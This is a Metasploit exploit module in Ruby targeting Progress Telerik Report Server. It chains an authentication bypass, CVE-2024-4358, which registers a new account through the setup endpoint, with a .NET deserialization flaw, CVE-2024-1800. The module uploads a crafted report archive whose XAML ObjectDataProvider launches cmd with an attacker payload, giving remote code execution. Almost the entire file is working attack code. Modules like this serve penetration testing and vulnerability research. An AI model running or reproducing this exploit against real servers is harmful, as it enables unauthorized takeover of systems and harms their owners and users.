# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '',
      'Description'    => %q{
      },
      'Author'         => [
        'SinSinology', # CVE-2024-4358 discovery, original PoC and vulnerability write-up
        'Soroush Dalili', # CVE-2024-1800 exploitation assistance
        'Unknown', # CVE-2024-1800 discovery
        'Spencer McIntyre' # MSF module
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CVE', '2024-1800' ], # .NET deserialization vulnerability
        [ 'CVE', '2024-4358' ], # Authentication bypass
        [ 'URL', 'https://summoning.team/blog/progress-report-server-rce-cve-2024-4358-cve-2024-1800/' ]
      ],
      'Platform'       => 'win',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          [ 'Automatic',   {  } ],
        ],
      'DefaultOptions' =>
        {
          'SSL' => false,
          'RPORT' => 83
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2024-06-04',
      'Notes'          =>
        {
          'Stability'   => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
          'Reliability' => [ REPEATABLE_SESSION, ],
        }
    ))

    register_options([
      OptString.new('TARGETURI', [ true, 'The base path to the web application', '/' ]),
      OptString.new('USERNAME', [false, 'Username for the new account', ""]),
      OptString.new('PASSWORD', [false, 'Password for the new account', Rex::Text.rand_text_alphanumeric(12)])
    ])
  end

  def check
    CheckCode::Unsupported
  end

  def username
    @username ||= datastore['USERNAME'].blank? ? Rex::Text.rand_text_alphanumeric(12) : datastore['USERNAME']
  end

  def password
    @password ||= datastore['PASSWORD'].blank? ? Rex::Text.rand_text_alphanumeric(12) : datastore['PASSWORD']
  end

  def create_account
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'Startup/Register'),
      'vars_post' => {
        'Username' => username,
        'Password' => password,
        'ConfirmPassword' => password,
        'Email' => Faker::Internet.email,
        'FirstName' => Faker::Name.first_name,
        'LastName' => Faker::Name.last_name
      }
    )
    fail_with(Failure::Unreachable, 'No response received') if res.nil?
    fail_with(Failure::UnexpectedReply, 'Failed to create the new account') unless res.code == 302 && res.headers['location']&.end_with?('/Report/Index')

    print_good("Successfully created account #{username}:#{password}")
  end

  def login
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'Token'),
      'vars_post' => {
        'grant_type' => 'password',
        'username' => username,
        'password' => password
      }
    )

    fail_with(Failure::Unreachable, 'No response received') if res.nil?
    fail_with(Failure::UnexpectedReply, 'Failed to login to the target (invalid response)') unless res.headers['content-type']&.start_with?('application/json')
    fail_with(Failure::NoAccess, 'Failed to login to the target (invalid credentials)') unless res.code == 200

    access_token = res.get_json_document['access_token']
    fail_with(Failure::UnexpectedReply, 'Failed to login to the target (missing access token)') unless access_token.present?

    print_good("Successfully authenticated as #{username}")
    access_token
  end

  def build_trdp
    zip = Rex::Zip::Archive.new
    zip.add_file(
      '[Content_Types].xml',
      Nokogiri::XML(<<-XML, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).to_xml(indent: 0, save_with: 0)
        <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
          <Default Extension="xml" ContentType="application/zip" />
        </Types>
      XML
    )
    zip.add_file(
      'definition.xml',
      Nokogiri::XML(<<-XML, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
        <Report Width="6.5in" Name="oooo" xmlns="http://schemas.telerik.com/reporting/2021/1.0">
          <Items>
            <ResourceDictionary
                xmlns="clr-namespace:System.Windows;Assembly:PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
                xmlns:System="clr-namespace:System;assembly:mscorlib"
                xmlns:Diag="clr-namespace:System.Diagnostics;assembly:System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                xmlns:ODP="clr-namespace:System.Windows.Data;Assembly:PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
              >
              <ODP:ObjectDataProvider MethodName="Start" >
                <ObjectInstance>
                  <Diag:Process>
                    <StartInfo>
                      <Diag:ProcessStartInfo FileName="cmd" Arguments=#{"/c #{payload.encoded}".encode(xml: :attr)}></Diag:ProcessStartInfo>
                    </StartInfo>
                  </Diag:Process>
                </ObjectInstance>
              </ODP:ObjectDataProvider>
            </ResourceDictionary>
          </Items>
        </Report>
      XML
    )
    zip.pack
  end

  def exploit
    create_account
    access_token = login

    report_name = rand_text_alphanumeric(10)
    category_name = rand_text_alphanumeric(10)

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'api/reportserver/report'),
      'headers' => {
        'Authorization' => "Bearer #{access_token}"
      },
      'ctype' => 'application/json',
      'data' => {
        'reportName' => report_name,
        'categoryName' => 'Samples',
        'description' => nil,
        'reportContent' => Rex::Text.encode_base64(build_trdp),
        'extension' => '.trdp'
      }.to_json
    )
    fail_with(Failure::Unreachable, 'No response received') if res.nil?
    fail_with(Failure::UnexpectedReply, 'Failed to create the report (invalid response)') unless res.code == 200

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'api/reports/clients'),
      'headers' => {
        'Authorization' => "Bearer #{access_token}"
      },
      'ctype' => 'application/json',
      'data' => {
        'timeStamp' => nil
      }.to_json
    )
    fail_with(Failure::Unreachable, 'No response received') if res.nil?

    client_id = res.get_json_document['clientId']
    fail_with(Failure::UnexpectedReply, 'Failed to obtain the client ID') unless client_id.present?


    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'api/reports/clients', client_id, 'parameters'),
      'headers' => {
        'Authorization' => "Bearer #{access_token}"
      },
      'ctype' => 'application/json',
      'data' => {
        'report' => "NAME/Samples/#{report_name}/",
        'parameterValues' => {}
      }.to_json
    )
    fail_with(Failure::Unreachable, 'No response received') if res.nil?
  end
end
